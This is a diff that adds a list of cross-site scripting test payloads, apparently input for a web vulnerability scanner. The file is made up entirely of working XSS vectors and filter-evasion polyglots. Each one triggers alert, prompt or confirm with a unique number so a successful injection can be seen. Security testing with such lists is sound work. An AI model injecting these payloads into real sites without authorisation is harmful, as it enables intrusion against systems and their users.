@@ -1,0 +1,22 @@
+# Cross-site scripting tests
+# Payloads that use alert, prompt or confirm. All payloads have a unique number associated with them ( __RINT__ )
+<script>alert(__RINT__)</script>
+<svg/onload=alert(__RINT__)>
+<svg onload="alert(__RINT__)" <="" svg=""
+<svG/x=">"/oNloaD=confirm(__RINT__)//
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(__RINT__) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(__RINT__)//>\x3e
+<d3"<"/onclick="1>[confirm`__RINT__`]"<">z
+<details open ontoggle=confirm(__RINT__)>
+<script y="><">/*<script* */prompt(__RINT__)</script
+<a href="javascript%26colon;alert(__RINT__)">click
+<a href=javas&#99;ript:alert(__RINT__)>click
+<svg/x=">"/onload=confirm(__RINT__)//
+<--`<img/src=` onerror=confirm`__RINT__`> --!>
+<svg%0Aonload=%09((pro\u006dpt))(__RINT__)//
+<svg </onload ="1> (_=prompt,_(__RINT__)) "">
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`__RINT__` //>
+<iframe/src \/\/onload = prompt(__RINT__)
+<x oncut=alert(__RINT__)>x
+<svg onload=write(__RINT__)>
+'"><img/src/onerror=alert`__RINT__`>
+'"><svg/onload=alert(__RINT__)//
